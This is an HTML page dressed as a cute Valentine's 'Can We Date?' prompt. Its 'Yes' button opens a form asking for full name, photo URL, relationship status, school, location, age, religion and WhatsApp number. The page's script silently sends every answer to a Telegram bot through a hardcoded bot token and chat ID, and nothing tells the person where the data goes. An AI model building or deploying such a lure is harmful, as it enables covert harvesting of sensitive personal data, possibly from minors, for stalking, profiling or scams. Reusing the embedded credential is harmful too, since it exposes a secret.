<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Will You Be Mine? 💖</title>
  <!-- Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Pacifico&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary-gradient: linear-gradient(45deg, #ff6b6b, #ff8e8e);
      --secondary-gradient: linear-gradient(45deg, #4CAF50, #45a049);
    }

    body {
      margin: 0;
      padding: 0;
      overflow-x: hidden;
      font-family: 'Dancing Script', cursive;
      background: var(--primary-gradient);
      min-height: 100vh;
      position: relative;
    }

    .heart-loader {
      width: 50px;
      height: 50px;
      animation: pulse 1.5s infinite;
    }

    @keyframes pulse {
      0% { transform: scale(0.95); }
      50% { transform: scale(1.1); }
      100% { transform: scale(0.95); }
    }

    .glow-box {
      background: rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      backdrop-filter: blur(10px);
      box-shadow: 0 0 30px rgba(255, 255, 255, 0.3);
      border: 2px solid rgba(255, 255, 255, 0.2);
    }

    .btn-custom {
      padding: 15px 30px;
      font-size: 1.5rem;
      border-radius: 50px;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
      border: none;
    }

    .btn-custom:before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(
        120deg,
        transparent,
        rgba(255, 255, 255, 0.3),
        transparent
      );
      transition: 0.5s;
    }

    .btn-custom:hover:before {
      left: 100%;
    }

    .yes-btn {
      background: var(--secondary-gradient);
      box-shadow: 0 0 20px #4CAF50;
    }

    .no-btn {
      background: linear-gradient(45deg, #f44336, #d32f2f);
      box-shadow: 0 0 20px #f44336;
    }

    .form-control-custom {
      background: rgba(255, 255, 255, 0.1);
      border: 2px solid rgba(255, 255, 255, 0.2);
      color: white;
      border-radius: 15px;
      padding: 15px 20px;
      transition: all 0.3s ease;
    }

    .form-control-custom:focus {
      background: rgba(255, 255, 255, 0.2);
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
      border-color: rgba(255, 255, 255, 0.4);
      color: white;
    }

    .modal-content {
      background: var(--primary-gradient);
      border: 2px solid rgba(255, 255, 255, 0.3);
      border-radius: 20px;
    }

    .floating {
      animation: float 3s ease-in-out infinite;
    }

    @keyframes float {
      0% { transform: translateY(0px); }
      50% { transform: translateY(-20px); }
      100% { transform: translateY(0px); }
    }

    .confetti {
      position: fixed;
      width: 10px;
      height: 10px;
      background: #fff;
      animation: confetti-fall 3s linear infinite;
      z-index: 9999;
    }

    @keyframes confetti-fall {
      0% { transform: translateY(-100vh) rotate(0deg); }
      100% { transform: translateY(100vh) rotate(360deg); }
    }
  </style>
</head>
<body class="d-flex align-items-center">
  <!-- Loading Spinner -->
  <div id="loading" class="position-fixed w-100 h-100 bg-dark d-flex align-items-center justify-content-center" style="z-index: 9999; display: none;">
    <div class="heart-loader text-danger">
      <i class="fas fa-heart fa-2x"></i>
    </div>
  </div>

  <!-- Main Content -->
  <div class="container py-5">
    <div class="row justify-content-center">
      <div class="col-md-8 text-center">
        <div class="glow-box p-5 mb-4">
          <h1 class="text-white display-3 mb-4 floating">
            Can We Date? 💖
          </h1>
          <div class="d-flex justify-content-center gap-4">
            <button class="btn-custom yes-btn text-white" data-bs-toggle="modal" data-bs-target="#detailsModal">
              Yes! 🌹
            </button>
            <button class="btn-custom no-btn text-white" id="noBtn">
              No 😢
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Details Modal -->
  <div class="modal fade" id="detailsModal" tabindex="-1" aria-labelledby="detailsModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content">
        <div class="modal-header border-0">
          <h2 class="modal-title text-white w-100 text-center" id="detailsModalLabel">
            Tell Me More About You 💌
          </h2>
          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
          <form id="detailsForm">
            <div class="mb-3">
              <input type="text" class="form-control form-control-custom" placeholder="Your Full Name 🌟" required>
            </div>
            <div class="mb-3">
              <input type="url" class="form-control form-control-custom" placeholder="Profile Picture URL 📸" required>
            </div>
            <div class="mb-3">
              <select class="form-control form-control-custom" required>
                <option value="">Relationship Status 💑</option>
                <option>Single</option>
                <option>In a Relationship</option>
                <option>Complicated</option>
              </select>
            </div>
            <div class="mb-3">
              <input type="text" class="form-control form-control-custom" placeholder="School/University 🎓" required>
            </div>
            <div class="mb-3">
              <input type="text" class="form-control form-control-custom" placeholder="Location 🌍" required>
            </div>
            <div class="row mb-3">
              <div class="col">
                <input type="number" class="form-control form-control-custom" placeholder="Age 🎂" required>
              </div>
              <div class="col">
                <select class="form-control form-control-custom" required>
                  <option value="">Religion 🙏</option>
                  <option>Christianity</option>
                  <option>Islam</option>
                  <option>Hinduism</option>
                  <option>Buddhism</option>
                  <option>Other</option>
                </select>
              </div>
            </div>
            <div class="mb-3">
              <input type="tel" class="form-control form-control-custom" placeholder="WhatsApp Number 📱" required>
            </div>
            <button type="submit" class="btn-custom yes-btn w-100 text-white">
              Submit & Continue 💖
            </button>
          </form>
        </div>
      </div>
    </div>
  </div>

  <!-- Bootstrap JS -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    // Telegram Bot Integration
    const sendDetails = async (formData) => {
      const token = '7121768182:AAFHaGAAXgA78cK0nvDT8XWrJw_BbWUDPAE';
      const chatId = '7654035673';
      const message = `New Valentine Submission! ❤️\n
        Name: ${formData.name}\n
        Profile: ${formData.profile}\n
        Relationship: ${formData.relationship}\n
        School: ${formData.school}\n
        Location: ${formData.location}\n
        Age: ${formData.age}\n
        Religion: ${formData.religion}\n
        Contact: ${formData.contact}`;

      try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: message })
        });
        return true;
      } catch (error) {
        console.error('Error sending details:', error);
        return false;
      }
    };

    // Form Submission Handler
    document.getElementById('detailsForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const formElements = e.target.elements;
      
      const formData = {
        name: formElements[0].value,
        profile: formElements[1].value,
        relationship: formElements[2].value,
        school: formElements[3].value,
        location: formElements[4].value,
        age: formElements[5].value,
        religion: formElements[6].value,
        contact: formElements[7].value
      };

      const loader = document.getElementById('loading');
      loader.style.display = 'flex';

      try {
        const success = await sendDetails(formData);
        if(success) {
          // Create confetti
          for(let i = 0; i < 100; i++) {
            const confetti = document.createElement('div');
            confetti.className = 'confetti';
            confetti.style.left = Math.random() * 100 + 'vw';
            confetti.style.background = `hsl(${Math.random() * 360}, 70%, 60%)`;
            confetti.style.animationDelay = Math.random() * 2 + 's';
            document.body.appendChild(confetti);
          }

          // Show celebration
          document.getElementById('detailsModal').classList.remove('show');
          document.body.classList.add('modal-open');
          document.querySelector('.modal-backdrop').remove();
          
          // Play celebration animation
          setTimeout(() => {
            loader.style.display = 'none';
            alert('Thank you! Let the magic begin! 💖');
          }, 3000);
        }
      } catch (error) {
        loader.style.display = 'none';
        alert('Submission failed. Please try again.');
      }
    });

    // No Button Handler
    document.getElementById('noBtn').addEventListener('click', () => {
      document.body.style.background = 'linear-gradient(45deg, #2c3e50, #3498db)';
      alert('Thank you for being honest. My heart will go on... 💔');
    });
  </script>
</body>
</html>
